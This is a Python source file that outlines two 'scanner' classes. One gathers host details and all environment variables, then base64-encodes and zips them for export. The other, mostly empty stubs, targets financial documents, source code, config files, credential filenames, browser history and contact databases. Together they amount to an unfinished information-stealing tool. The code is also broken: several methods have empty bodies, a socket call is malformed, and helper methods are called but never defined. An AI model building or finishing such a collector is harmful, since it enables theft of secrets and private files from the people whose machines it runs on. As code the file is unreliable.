'''
 # @ Author: Newt Tan
 # @ Create Time: 2024-09-04 11:10:07
 # @ Modified by: Newt Tan
 # @ Modified time: 2024-09-04 11:35:24
 # @ Description: define two classes to achieve two different scanning methods
 '''
import platform
import socket
import psutil
import os
import uuid
import getpass
import re
import shutil
import sqlite3
import browserhistory as bh
import base64
import zipfile
import gzip


class SysInfoScanner:
    def __init__(self, ):
        pass

    def os_info(self, ):

        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Release": platform.release()
                }

    def mach_proc_info(self,):

        return {
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture(),

        }

    def user_info(self,):

        return {
            "User": getpass.getuser()
        }
        
    def network_info(self,):

        return {
            "IP Address": socket.gethostbyname(socket.gethostbyname()),
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                    for elements in range(0,2*6,2)][::-1])
        }

    def disk_info(self,):

        disk_info = psutil.disk_partitions()

        return {
            "Disk Partitions": [{"device": d.device, "mountpoint": d.mountpoint, 
                                 "fstype": d.fstype} 
                                for d in disk_info]
        }

    def mem_info(self,):

        virtual_mem = psutil.virtual_memory()

        return {
            "Total Memory": virtual_mem.total,
            "Available Memory": virtual_mem.available
        }

    def env_info(self,):
        return {
            "Environment Variables": dict(os.environ)
        }
    
    def _system_info(self,):
        ''' the module to scan system info and export to somewhere
        
        '''
        system_info = {}
        system_info.update(self.os_info())
        system_info.update(self.mach_proc_info())
        system_info.update(self.user_info())
        system_info.update(self.network_info())
        system_info.update(self.disk_info())
        system_info.update(self.mem_info())
        system_info.update(self.env_info())

        return system_info

    def _encode(self, info):
        ''' encode extracted system info with base64
        
        '''
        encoded_bytes = base64.b64encode(info.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        return encoded_str

    def _compress(self, info, save_location):
        ''' compress extracted info adapting the compression level to the OS type
        
        '''
        os_type = platform.system()
        if os_type == "Windows":
            compression_level = zipfile.ZIP_DEFLATED
            with zipfile.ZipFile(save_location, 'w', compression=compression_level) as zipf:
                zipf.writestr('info.zip', info)

        elif os_type == 'Linux':
            compression_level = 6  # Balanced compression
        else:  # macOS or other systems
            compression_level = 9  # Maximum compression


class SenInfoScanner:
    def __init__(self, ):


    def _ext_scan(self, target_ext: list):
        ''' cover potential sensitive info via file extension
        
        - financial spreadsheets (.xls, .xlsx, .csv)
        - documents (.docx, .pdf)
        - intellectual property (IP) (.pptx, .py, .js)
        - configuration files (.conf, .ini, .xml)
        '''


    def _filename_scan(self,):
        ''' cover the filenames that can contain credentials info
        
        '''
    
    def _brw_hist(self,):
        ''' 
        
        '''
    
    def _cache(self,):
    
    def _db(self,):
        ''' cover potential db info like skype contact info
        
        '''

    def _path(self,):

    

    
    def _encode(self,):
        ''' encode extracted system info
        
        '''

    def _compress(self,):
        ''' compress extracted system info
        
        '''

    def _sen_info(self, save_location):
        ''' the module to collect sensitive info from specific locations/files/extensions
        
        '''
        target_ext = ['.xls', '.xlsx', '.csv', '.docx', '.pdf', '.pptx', '.py', '.js', '.conf', '.ini', '.xml']
        collected_info = {
            'file_extensions': self._ext_scan(target_ext),
            'sensitive_filenames': self._filename_scan(),
            'browser_history': self._brw_hist(),
            'cache_files': self._cache(),
            'databases': self._db(),
            'sensitive_paths': self._path()
        }

        # Encode the collected information
        encoded_info = self._encode_info(str(collected_info))

        # Compress the encoded information into a .zip file
        compressed_file = self._compress_info(encoded_info, save_location)

if __name__ == "__main__":
    pass